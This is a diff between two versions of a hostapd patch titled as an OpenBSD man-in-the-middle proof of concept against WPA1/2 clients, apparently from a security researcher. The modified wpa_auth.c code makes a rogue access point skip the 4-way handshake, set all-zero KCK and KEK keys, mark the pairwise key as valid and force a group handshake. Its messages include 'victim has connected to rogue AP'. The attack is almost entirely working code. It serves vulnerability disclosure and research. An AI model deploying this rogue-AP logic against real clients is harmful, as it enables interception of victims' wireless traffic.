@@ -1,13 +1,13 @@
-From d017d2aded0159e8836f690222d3c47a5a38404d Mon Sep 17 00:00:00 2001
+From 1d89a11537c409aa96205b180025d5668788b4db Mon Sep 17 00:00:00 2001
 From: Mathy <vanhoefm@users.noreply.github.com>
-Date: Sat, 22 Jul 2017 22:02:49 -0400
+Date: Wed, 26 Jul 2017 15:31:25 -0400
 Subject: [PATCH] OpenBSD man-in-the-middle against WPA1/2 clients PoC
 
 ---
  hostapd/defconfig    |  2 +-
  hostapd/hostapd.conf | 12 ++++++------
- src/ap/wpa_auth.c    | 41 +++++++++++++++++++++++++++++++++++++++++
- 3 files changed, 48 insertions(+), 7 deletions(-)
+ src/ap/wpa_auth.c    | 40 ++++++++++++++++++++++++++++++++++++++++
+ 3 files changed, 47 insertions(+), 7 deletions(-)
 
 diff --git a/hostapd/defconfig b/hostapd/defconfig
 index 4659dd1e6..1a24dbb2b 100644
@@ -75,7 +75,7 @@ index fa9a855a6..aa4571e23 100644
  # Time interval for rekeying GTK (broadcast/multicast encryption keys) in
  # seconds. (dot11RSNAConfigGroupRekeyTime)
 diff --git a/src/ap/wpa_auth.c b/src/ap/wpa_auth.c
-index 358708648..9929fd108 100644
+index 358708648..7dacd94d1 100644
 --- a/src/ap/wpa_auth.c
 +++ b/src/ap/wpa_auth.c
 @@ -53,6 +53,8 @@ static void wpa_group_get(struct wpa_authenticator *wpa_auth,
@@ -87,28 +87,13 @@ index 358708648..9929fd108 100644
  static const u32 dot11RSNAConfigGroupUpdateCount = 4;
  static const u32 dot11RSNAConfigPairwiseUpdateCount = 4;
  static const u32 eapol_key_timeout_first = 100; /* ms */
-@@ -1563,6 +1565,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
- 					     key_data_len);
- #endif /* CONFIG_NO_RC4 */
- 		} else {
-+			printf("%s: bad key descriptor or whatever (no RC4 no AES)\n", __FUNCTION__);
- 			os_free(hdr);
- 			os_free(buf);
- 			return;
-@@ -1597,6 +1600,7 @@ void __wpa_send_eapol(struct wpa_authenticator *wpa_auth,
- #endif /* CONFIG_TESTING_OPTIONS */
- 	}
- 
-+	printf("%s: calling wpa_auth_set_eapol and wpa_auth_send_eapol: sm->pairwise_set=%d\n", __FUNCTION__, sm->pairwise_set);
- 	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_inc_EapolFramesTx,
- 			   1);
- 	wpa_auth_send_eapol(wpa_auth, sm->addr, (u8 *) hdr, len,
-@@ -2021,9 +2025,16 @@ SM_STATE(WPA_PTK, PTKSTART)
+@@ -2021,9 +2023,17 @@ SM_STATE(WPA_PTK, PTKSTART)
  				  wpa_key_mgmt_sha256(sm->wpa_key_mgmt));
  		}
  	}
 +
 +#if 1
++	printf("[ ] Skipping 4-way handshake\n");
 +	attack_skip_ptk_start_group(sm, global);
 +#else
 +	printf(">>> Sending msg 1/4\n");
@@ -120,14 +105,12 @@ index 358708648..9929fd108 100644
  }
  
  
-@@ -2390,13 +2401,25 @@ SM_STATE(WPA_PTK, PTKINITDONE)
+@@ -2390,13 +2400,23 @@ SM_STATE(WPA_PTK, PTKINITDONE)
  	if (sm->Pair) {
  		enum wpa_alg alg = wpa_cipher_to_alg(sm->pairwise);
  		int klen = wpa_cipher_key_len(sm->pairwise);
 +#if 1
-+		printf(">>> PTKINITDONE: not installing PTK.tk keys using wpa_auth_set_key\n");
-+
-+		printf(">>> PTKINITDONE: setting all-zero KCK and KEK, each of length 16. Setting PTK as valid.\n");
++		printf("[ ] Not installing pairwise keys\n");
 +		sm->PTK.kck_len = 16;
 +		sm->PTK.kek_len = 16;
 +		memset(sm->PTK.kck, 0, sm->PTK.kck_len);
@@ -146,12 +129,12 @@ index 358708648..9929fd108 100644
  
  		if (sm->wpa_auth->conf.wpa_ptk_rekey) {
  			eloop_cancel_timeout(wpa_rekey_ptk, sm->wpa_auth, sm);
-@@ -2423,10 +2446,15 @@ SM_STATE(WPA_PTK, PTKINITDONE)
+@@ -2423,10 +2443,15 @@ SM_STATE(WPA_PTK, PTKINITDONE)
  	}
  	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyAvailable, 0);
  	wpa_auth_set_eapol(sm->wpa_auth, sm->addr, WPA_EAPOL_keyDone, 1);
 +#if 1
-+	printf(">>> PTKINITDONE: forcing group key handshake\n");
++	// This will force a group key handshake
 +	sm->GUpdateStationKeys = TRUE;
 +#else
  	if (sm->wpa == WPA_VERSION_WPA)
@@ -162,32 +145,53 @@ index 358708648..9929fd108 100644
  	wpa_auth_vlogger(sm->wpa_auth, sm->addr, LOGGER_INFO,
  			 "pairwise key handshake completed (%s)",
  			 sm->wpa == WPA_VERSION_WPA ? "WPA" : "RSN");
-@@ -2549,6 +2577,16 @@ SM_STEP(WPA_PTK)
+@@ -2549,6 +2574,12 @@ SM_STEP(WPA_PTK)
  }
  
  
 +static void attack_skip_ptk_start_group(STATE_MACHINE_DATA *sm, int global)
 +{
-+	printf(">>> Skipping msg 1/4, going to group 1/2\n");
-+
 +	SM_ENTER(WPA_PTK, PTKINITDONE);
-+
-+	printf(">>> We should be in group 1/2 now\n");
 +}
 +
 +
  SM_STATE(WPA_PTK_GROUP, IDLE)
  {
  	SM_ENTRY_MA(WPA_PTK_GROUP, IDLE, wpa_ptk_group);
-@@ -2618,6 +2656,7 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
+@@ -2569,6 +2600,7 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
+ 	u8 *kde_buf = NULL, *pos, hdr[2];
+ 	size_t kde_len;
+ 	u8 *gtk, dummy_gtk[32];
++	int i;
+ 
+ 	SM_ENTRY_MA(WPA_PTK_GROUP, REKEYNEGOTIATING, wpa_ptk_group);
+ 
+@@ -2618,6 +2650,10 @@ SM_STATE(WPA_PTK_GROUP, REKEYNEGOTIATING)
  		kde_len = gsm->GTK_len;
  	}
  
-+	printf(">>> Sending group 1/2\n");
++	// Sleep so we are sure the association response is processed bebfore
++	// the Group Message 1/2 we are sending now.
++	usleep(500 * 1000);
++	printf("[+] Performing man-in-the-middle attack: sending group 1/2\n");
  	wpa_send_eapol(sm->wpa_auth, sm,
  		       WPA_KEY_INFO_SECURE | WPA_KEY_INFO_MIC |
  		       WPA_KEY_INFO_ACK |
-@@ -2895,6 +2934,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
+@@ -2636,11 +2672,13 @@ SM_STATE(WPA_PTK_GROUP, REKEYESTABLISHED)
+ 		sm->group->GKeyDoneStations--;
+ 	sm->GUpdateStationKeys = FALSE;
+ 	sm->GTimeoutCtr = 0;
++	printf("[+] Received Group Message 2 from the victim!\n");
+ 	/* FIX: MLME.SetProtection.Request(TA, Tx_Rx) */
+ 	wpa_auth_vlogger(sm->wpa_auth, sm->addr, LOGGER_INFO,
+ 			 "group key handshake completed (%s)",
+ 			 sm->wpa == WPA_VERSION_WPA ? "WPA" : "RSN");
+ 	sm->has_GTK = TRUE;
++	printf("[+] Attack successful: victim has connected to rogue AP\n");
+ }
+ 
+ 
+@@ -2895,6 +2933,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
  {
  	int ret = 0;
  
@@ -195,7 +199,7 @@ index 358708648..9929fd108 100644
  	if (wpa_auth_set_key(wpa_auth, group->vlan_id,
  			     wpa_cipher_to_alg(wpa_auth->conf.wpa_group),
  			     broadcast_ether_addr, group->GN,
-@@ -2916,6 +2956,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
+@@ -2916,6 +2955,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
  			ret = -1;
  	}
  #endif /* CONFIG_IEEE80211W */
